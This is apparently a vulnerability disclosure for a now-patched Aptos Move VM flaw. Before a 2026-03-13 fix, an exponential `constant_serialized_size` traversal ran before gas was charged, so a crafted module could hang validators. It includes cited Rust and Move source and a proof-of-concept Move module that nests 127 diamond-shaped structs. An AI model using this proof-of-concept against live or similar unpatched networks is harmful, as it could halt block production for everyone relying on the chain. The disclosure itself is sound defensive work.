### Title
Pre-2026-03-13 Validator Hang via Exponential `constant_serialized_size` Traversal on Diamond-Shaped Type — (`aptos-move/framework/move-stdlib/src/natives/bcs.rs`, `third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs`)

---

### Summary

Before `ConstantSerializedSizeLocalCache` was enabled on mainnet (2026-03-13), an unprivileged user could publish a module containing a 127-level diamond-shaped struct hierarchy (L0–L126, each level having 4 fields of the previous level) and call `bcs::constant_serialized_size<L126>()` — either directly or via `BigOrderedMap::new<L126, u64>()`. The native implementation performed the full exponential traversal (~4^126 recursive calls) **before** charging per-node gas, causing the validator to hang indefinitely.

---

### Finding Description

**Step 1 — Layout construction succeeds (O(DAG size))**

`native_constant_serialized_size` first calls `context.type_to_type_layout(ty)` to build the `MoveTypeLayout`. [1](#0-0) 

The layout converter uses `LocalSinglePassStructLayoutCache` (enabled when `gas_feature_version >= RELEASE_V1_41`) to share `Arc<MoveStructLayout>` on repeated struct references, so the layout for L126 is a DAG of 509 unique nodes — just under the `layout_max_size = 512` hard cap. [2](#0-1) [3](#0-2) 

The test comment confirms: "509 DAG nodes, depth 128. Without deduplication, `constant_serialized_size` would visit ~4^128/3 nodes." [4](#0-3) 

**Step 2 — Traversal is exponential without the cache**

After layout construction, the native checks the timed feature flag:

```rust
let use_local_struct_cache =
    context.timed_feature_enabled(TimedFeatureFlag::ConstantSerializedSizeLocalCache);
let (visited_count, serialized_size_result) =
    constant_serialized_size(&ty_layout, use_local_struct_cache);
``` [5](#0-4) 

`ConstantSerializedSizeLocalCache` was not enabled on mainnet until 2026-03-13: [6](#0-5) 

With `use_local_struct_cache = false`, `constant_serialized_size_impl` skips the `Arc`-pointer-identity cache entirely: [7](#0-6) 

Because the layout is a DAG (shared `Arc` pointers), each of the 4 L125 references in L126 is the **same** `Arc`, but without the cache the function re-expands each one independently. This produces 4^126 recursive calls.

**Step 3 — Gas is charged AFTER the traversal**

The per-node gas charge happens only after `constant_serialized_size` returns:

```rust
context.charge(BCS_CONSTANT_SERIALIZED_SIZE_BASE)?;          // charged before
let (visited_count, ...) = constant_serialized_size(...);    // exponential work here
context.charge(BCS_CONSTANT_SERIALIZED_SIZE_PER_TYPE_NODE    // charged after
    * NumTypeNodes::new(visited_count))?;
``` [8](#0-7) 

`visited_count` saturates at `u64::MAX` via `saturating_add`, so the post-hoc charge is capped at `u64::MAX` nodes — but the actual CPU work is 4^126 iterations, which is astronomically larger. The validator thread hangs before the gas check fires. [9](#0-8) 

**Step 4 — Module publish is not blocked**

The bytecode verifier limits that were active before 2026-03-13:
- `max_struct_definitions`: `None` before 2026-02-27, then 200 after `EnableStrictBoundsInProdConfig`. L126 requires 127 structs — always below the limit.
- `max_fields_in_struct`: 64 after `EnableStrictBoundsInProdConfig`. Each struct has 4 fields — well below. [10](#0-9) 

The `BigOrderedMap::new` path also calls `constant_serialized_size` twice (for K and V): [11](#0-10) 

But the attacker does not even need `BigOrderedMap` — calling `bcs::constant_serialized_size<L126>()` directly from a public entry function is sufficient, since `constant_serialized_size` is a `public native fun`. [12](#0-11) 

---

### Impact Explanation

A single crafted transaction causes the validator's execution thread to spin in a 4^126-deep recursive traversal with no gas precheck. The node hangs indefinitely, producing a material chain availability failure. All validators executing the block containing this transaction are affected simultaneously.

---

### Likelihood Explanation

The attack requires only:
1. Publishing a module with 127 structs (trivially within all verifier limits).
2. Submitting one entry-function transaction calling `bcs::constant_serialized_size<L126>()`.

No privileged keys, governance access, or validator control is needed. The window was open from when `enable_struct_layout_local_cache` (RELEASE_V1_41) was deployed until 2026-03-13.

---

### Recommendation

The fix — `ConstantSerializedSizeLocalCache` — is already deployed on mainnet (2026-03-13). No further action is required for the immediate issue. As a defense-in-depth measure, consider charging gas **before** the traversal (pre-charge a conservative upper bound based on `layout_max_size`) rather than post-hoc, to prevent any future "work before gas" pattern in native functions.

---

### Proof of Concept

```move
module attacker::poc {
    use std::bcs;

    struct L0 has copy, drop, store { f0: u64, f1: u64, f2: u64, f3: u64 }
    struct L1 has copy, drop, store { f0: L0, f1: L0, f2: L0, f3: L0 }
    // ... L2 through L126, each with 4 fields of the previous level ...
    struct L126 has copy, drop, store { f0: L125, f1: L125, f2: L125, f3: L125 }

    public entry fun hang(_: &signer) {
        // Before 2026-03-13: triggers 4^126 recursive calls in constant_serialized_size_impl
        // Gas is charged only after the traversal completes — node hangs indefinitely.
        let _ = bcs::constant_serialized_size<L126>();
    }
}
```

Expected result (pre-fix): validator execution thread hangs; block never finalizes.
Expected result (post-fix, 2026-03-13+): transaction completes in O(509) steps with the Arc-identity cache.

### Citations

**File:** aptos-move/framework/move-stdlib/src/natives/bcs.rs (L180-190)
```rust
    context.charge(BCS_CONSTANT_SERIALIZED_SIZE_BASE)?;

    let ty = &ty_args[0];
    let ty_layout = context.type_to_type_layout(ty)?;

    let use_local_struct_cache =
        context.timed_feature_enabled(TimedFeatureFlag::ConstantSerializedSizeLocalCache);
    let (visited_count, serialized_size_result) =
        constant_serialized_size(&ty_layout, use_local_struct_cache);
    context
        .charge(BCS_CONSTANT_SERIALIZED_SIZE_PER_TYPE_NODE * NumTypeNodes::new(visited_count))?;
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L195-213)
```rust
        max_struct_definitions: if strict_bounds {
            if revised_bounds {
                Some(1100)
            } else {
                Some(200)
            }
        } else {
            None
        },
        max_struct_variants: if strict_bounds {
            if revised_bounds {
                Some(127)
            } else {
                Some(64)
            }
        } else {
            None
        },
        max_fields_in_struct: if strict_bounds { Some(64) } else { None },
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L258-262)
```rust
    let layout_max_size = if gas_feature_version >= RELEASE_V1_30 {
        512
    } else {
        256
    };
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L454-470)
```rust
        let use_local_cache = self.vm_config().enable_struct_layout_local_cache;
        // Check the per-construction-pass cache. On hit, return the shared Arc without
        // re-constructing or re-counting nodes. Uses a borrowed key to avoid allocation.
        let insert_into_cache = if use_local_cache {
            if let Some((cached_layout, contains_delayed_fields)) = struct_layout_cache
                .select::<ANNOTATED>()
                .get(&StructLayoutKeyRef { idx: *idx, ty_args })
            {
                return Ok((
                    MoveTypeLayout::Struct(cached_layout.clone()),
                    *contains_delayed_fields,
                ));
            }
            true
        } else {
            false
        };
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L761-809)
```rust
        MoveTypeLayout::Struct(arc) => {
            let ptr = Arc::as_ptr(arc);
            if use_local_struct_cache {
                if let Some(&cached) = cache.get(&ptr) {
                    // Repeated struct references during layout construction increment the node
                    // counter by 1, not by all descendants.
                    return (1, Ok(cached));
                }
            }

            // Structs have constant size, but not enums.
            let size = match arc.as_ref() {
                MoveStructLayout::RuntimeVariants(_) | MoveStructLayout::WithVariants { .. } => {
                    None
                },
                MoveStructLayout::Runtime(fields) => {
                    let mut total: Option<usize> = Some(0);
                    for field in fields {
                        let (cur_count, cur) =
                            constant_serialized_size_impl(field, cache, use_local_struct_cache);
                        visited_count = visited_count.saturating_add(cur_count);
                        match cur {
                            Err(e) => return (visited_count, Err(e)),
                            Ok(Some(v)) => total = total.and_then(|s| s.checked_add(v)),
                            Ok(None) => {
                                total = None;
                                break;
                            },
                        }
                    }
                    total
                },
                MoveStructLayout::WithFields(_) | MoveStructLayout::WithTypes { .. } => {
                    return (
                        visited_count,
                        Err(PartialVMError::new(StatusCode::VALUE_SERIALIZATION_ERROR)
                            .with_message(
                                "Only runtime types expected, but found WithFields/WithTypes"
                                    .to_string(),
                            )),
                    );
                },
            };

            if use_local_struct_cache {
                cache.insert(ptr, size);
            }
            return (visited_count, Ok(size));
        },
```

**File:** aptos-move/e2e-move-tests/src/tests/bcs.rs (L73-97)
```rust
/// Generates the L0-L126 DAG Move source (509 DAG nodes, depth 128).
///
/// L0 has 4 u64 fields. L1 to L126 each reference the previous level four times.
/// Without deduplication, `constant_serialized_size` would visit ~4^128/3 nodes.
/// With the deduplication via caching of same struct nodes, `constant_serialized_size`
/// completes in O(DAG size).
fn constant_size_dag_source() -> String {
    // L0 has 4 u64 fields.
    let mut src = String::from(
        "module 0xcafe::test {\n    use std::bcs;\n\n\
         struct L0 has drop { f0: u64, f1: u64, f2: u64, f3: u64 }\n",
    );
    // L1 to L126 each reference the previous level four times.
    for i in 1..=126 {
        src.push_str(&format!(
            "    struct L{i} has drop {{ f0: L{p}, f1: L{p}, f2: L{p}, f3: L{p} }}\n",
            i = i,
            p = i - 1,
        ));
    }
    src.push_str(
        "    public entry fun run() { let _ = bcs::constant_serialized_size<L126>(); }\n}",
    );
    src
}
```

**File:** types/src/on_chain_config/timed_features.rs (L229-236)
```rust
            (ConstantSerializedSizeLocalCache, TESTNET) => Los_Angeles
                .with_ymd_and_hms(2026, 3, 11, 21, 0, 0)
                .unwrap()
                .with_timezone(&Utc),
            (ConstantSerializedSizeLocalCache, MAINNET) => Los_Angeles
                .with_ymd_and_hms(2026, 3, 13, 10, 0, 0)
                .unwrap()
                .with_timezone(&Utc),
```

**File:** aptos-move/framework/aptos-framework/sources/datastructures/big_ordered_map.move (L203-209)
```text
    public fun new<K: store, V: store>(): BigOrderedMap<K, V> {
        assert!(
            bcs::constant_serialized_size<K>().is_some() && bcs::constant_serialized_size<V>().is_some(),
            error::invalid_argument(ECANNOT_USE_NEW_WITH_VARIABLE_SIZED_TYPES)
        );
        new_with_config(0, 0, false)
    }
```

**File:** aptos-move/framework/move-stdlib/sources/bcs.move (L27-27)
```text
    native public fun constant_serialized_size<MoveValue>(): Option<u64>;
```
